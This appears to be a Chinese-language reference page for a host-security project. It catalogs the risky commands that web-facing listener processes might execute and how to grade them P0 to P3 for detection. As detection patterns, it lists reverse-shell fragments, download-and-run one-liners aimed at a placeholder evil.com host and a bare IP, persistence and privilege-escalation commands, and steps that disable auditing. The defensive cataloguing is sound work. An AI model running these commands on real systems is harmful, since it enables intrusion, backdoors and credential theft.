# 对外监听进程命令风险模式参考

**语言：** [English](23-external-listener-command-risk.md) | 简体中文（本文）

> SecWeaver 风险模式参考\
> 适用数据：对外监听端口进程的 `exec` 命令执行事件（auditd / audit-port-execmon 输出）  
> 用途：帮助运营理解命令风险线索；执行与最终裁决使用 risk-identification\
> Agent Skill：`src/skills/external-listener-cmd-risk/SKILL.md`

---

**按任务阅读：** 可直接跳到需要的章节，不必从头通读。

- [二、高危等级定义](#二高危等级定义)
- [三、高风险命令模式](#三高风险命令模式)
- [七、执行与复核](#七执行与复核)

本文用于理解风险模式和研判示例；当前可执行规则与策略分别以[规则包](../src/skills/risk-identification/rules/README.zh-CN.md)和[运营手册](../src/skills/risk-identification/OPS-HANDBOOK.zh-CN.md)为准。

## 一、识别原则

### 1.1 先判「该不该执行命令」

对外 Web/API 服务进程，正常行为通常是：

- 监听端口
- 处理请求
- 读写业务文件
- 连接数据库/缓存

**不应出现：**

- 启动 shell
- 下载外网文件
- 编译/打包
- 改系统配置
- 提权
- 探测内网

识别分两层：

```text
第一层：这个进程有没有执行命令？（异常本身）
第二层：执行的是什么命令？（高危分级）
```

### 1.2 结合上下文加权

同样一条命令，严重等级会因上下文变化：

| 上下文 | 影响 |
|---|---|
| 监听 443 的 Web 进程 | 权重更高 |
| 监听 22 且已在白名单 | 可降级 |
| 命令来自 php-fpm/nginx 子进程 | 高危 |
| 命令参数含 `http://`、base64、管道链 | 高危 |
| 工作目录在 `/tmp`、`/dev/shm` | 高危 |
| 文件路径含 `upload`、`www` | WebShell 嫌疑高 |

---

## 二、高危等级定义

下表解释最终等级的含义。后文按模式分类，不承诺某个命令必然得到该等级；最终结果经过 JSON 检测、行为策略和环境白名单裁决：

| 等级 | 含义 | 建议动作 |
|---|---|---|
| **P0 严重** | 明确攻击/后门行为 | 立即告警、隔离主机 |
| **P1 高危** | 高度可疑，极像入侵 | 5 分钟内人工确认 |
| **P2 中危** | 异常但需结合上下文 | 自动研判 + 观察 |
| **P3 低危** | 可能误报或运维行为 | 记录、聚合、降噪 |

---

## 三、高风险命令模式

### 3.1 Shell / 解释器执行

```text
/bin/sh
/bin/bash
/bin/dash
/bin/zsh
/bin/ksh
/usr/bin/python
/usr/bin/python3
/usr/bin/perl
/usr/bin/ruby
/usr/bin/node
/usr/bin/php
```

**需要关注的上下文：**

- 监听端口进程直接 exec
- 或其子进程 exec
- 且父进程是 nginx / php-fpm / java / tomcat / node

**典型攻击：**

- WebShell 执行命令
- 反弹 shell
- 下载并运行脚本

---

### 3.2 反弹 Shell / 远程控制

```text
bash -i
sh -i
/bin/bash -c
/bin/sh -c
exec bash
exec sh
mkfifo
nc -e
nc -c
ncat -e
socat exec
python -c 'import socket'
perl -e 'use Socket'
ruby -socket
php -r 'fsockopen'
```

**高危参数特征：**

```text
/dev/tcp/
/dev/udp/
>& /dev/tcp/
0>&1
2>&1
/bin/sh -i
bash -i >&
```

---

### 3.3 下载并执行

```text
curl
wget
fetch
aria2c
axel
lwp-download
python -m urllib
powershell
certutil
bitsadmin
```

**高危组合：**

```text
curl http*
curl https*
curl -O
curl -o
wget http*
wget -O
curl | sh
wget | bash
curl | python
wget | php
```

**P0 示例：**

```bash
curl http://evil.com/shell.sh | bash
wget -O /tmp/x http://1.2.3.4/a && chmod +x /tmp/x && /tmp/x
```

---

### 3.4 权限提升 / 提权工具

```text
sudo
su
pkexec
doas
gpasswd
passwd root
chattr -i
setcap
capsh
newgrp
runuser
```

**提权 exploit 工具：**

```text
linpeas
linenum
linux-exploit-suggester
dirtycow
overlayfs
cve-2021-4034
pwnkit
```

---

### 3.5 持久化 / 后门安装

```text
crontab
systemctl enable
systemctl start
update-rc.d
chkconfig
rc.local
authorized_keys
ssh-keygen
useradd
adduser
usermod -aG
echo >> /etc/passwd
echo >> /etc/shadow
echo >> ~/.ssh/authorized_keys
```

**高危路径：**

```text
/etc/cron*
/etc/systemd/system/
~/.ssh/authorized_keys
/etc/rc.local
/etc/profile
/etc/bashrc
```

---

### 3.6 防火墙 / 安全策略破坏

```text
iptables -F
iptables -X
iptables -P INPUT ACCEPT
ufw disable
firewall-cmd --reload
setenforce 0
auditctl -D
service auditd stop
systemctl stop auditd
systemctl disable auditd
```

---

## 四、需要重点复核的命令

### 4.1 信息收集 / 内网探测

```text
whoami
id
uname -a
hostname
ifconfig
ip addr
ip route
netstat
ss -lntp
ps aux
ps -ef
cat /etc/passwd
cat /etc/shadow
cat /etc/hosts
cat /proc/version
cat /proc/cpuinfo
env
printenv
ls -la /
find / -writable
find / -perm -4000
locate passwd
```

**内网扫描：**

```text
nmap
masscan
fping
arp-scan
ping -c
traceroute
dig
nslookup
host
```

---

### 4.2 网络外传 / 代理工具

```text
nc
ncat
netcat
socat
ssh
scp
sftp
rsync
ftp
telnet
proxychains
tsocks
```

**高危参数：**

```text
ssh root@
scp *@
rsync -e ssh
-L 8080:
-R 4444:
```

---

### 4.3 编码混淆 / 绕过检测

```text
base64 -d
base64 --decode
xxd -r
openssl enc
printf \x
echo -e
python -c
perl -e
php -r
eval(
exec(
system(
passthru(
shell_exec(
```

**高危特征：**

```text
base64 -d | bash
echo xxx | base64 -d | sh
python -c "import os; os.system(...)"
php -r "system(...)"
```

---

### 4.4 文件写入 / WebShell 落地

```text
echo >
echo >>
tee
cat >
cat >>
cp
mv
install
touch
mkdir
```

**高危路径：**

```text
/var/www/
/usr/share/nginx/
/home/*/public_html/
/tmp/
/dev/shm/
/upload/
/shell.php
/.php
/.jsp
/.asp
/.aspx
/.phtml
/.htaccess
```

**高危文件名：**

```text
shell
webshell
cmd
backdoor
c99
r57
b374k
phpinfo
```

---

### 4.5 编译 / 打包 / 运行二进制

```text
gcc
g++
make
cmake
go build
javac
python setup.py
chmod +x
./
exec ./
```

Web 进程编译或 `chmod +x` 后直接执行二进制，通常是后门或挖矿程序落地。

---

## 五、需要结合上下文的普通命令

### 5.1 普通系统管理命令

```text
ls
cat
head
tail
grep
awk
sed
cut
sort
wc
pwd
cd
date
uptime
free
df
du
top
htop
```

**升级条件：**

- 读取敏感文件：`/etc/passwd`、`/etc/shadow`、`.env`、`config.php`
- 读取密钥：`.pem`、`.key`、`id_rsa`
- 在 upload 目录执行

---

### 5.2 压缩 / 打包 / 传输准备

```text
tar
zip
gzip
gunzip
7z
rar
```

**升级条件：**

- 打包 `/var/www`、`/home`、数据库目录
- 输出到 `/tmp`、`/dev/shm`

---

### 5.3 数据库客户端

```text
mysql
mysqldump
psql
pg_dump
redis-cli
mongo
mongosh
sqlite3
```

**升级条件：**

- Web 进程直接调用
- 出现 `dump`、`select *`、`into outfile`

---

## 六、可申请环境降噪的命令

这些命令本身不一定恶意，但在 Web 进程里仍异常：

```text
which
whereis
file
stat
md5sum
sha1sum
sha256sum
base64
curl --version
wget --version
```

**处理建议：**

- 是否抑制或降级，由行为策略和限定环境范围的白名单决定；不能只按工具名放行。
- 关联高危行为时保留证据，由父引擎重新裁决。

---

## 七、执行与复核

运行规则存放于 `risk-identification/rules/*.json`；本文的命令模式不是可导入配置，不提供另一套 YAML 执行规则。

从仓库根目录运行离线样例：

```bash
python3 src/skills/risk-identification/scripts/assess.py \
  -i examples/risk-identification/s5-curl-download-exec-p0.json \
  -o /tmp/secweaver-command-risk.json
```

使用最终 `risk_items[]` 的 `severity`、`matched_rules`、`policy_rule_id` 和 `recommended_action`，同时复核证据及数据缺口。没有检测命中不等于无需告警：默认规则下 nginx → ls 为 P1/人工复核，详见[完整可复现样例](../src/skills/external-listener-cmd-risk/examples.zh-CN.md)。

规则维护见[规则包参考](../src/skills/risk-identification/rules/README.zh-CN.md)，策略与降噪操作见[运营手册](../src/skills/risk-identification/OPS-HANDBOOK.zh-CN.md)。命令风险不等于单条告警攻击成功；跨源攻击链另走[溯源分析](18-traceability-analysis.zh-CN.md)。外连、DNS、scp 等传输线索本身不能证明外传。
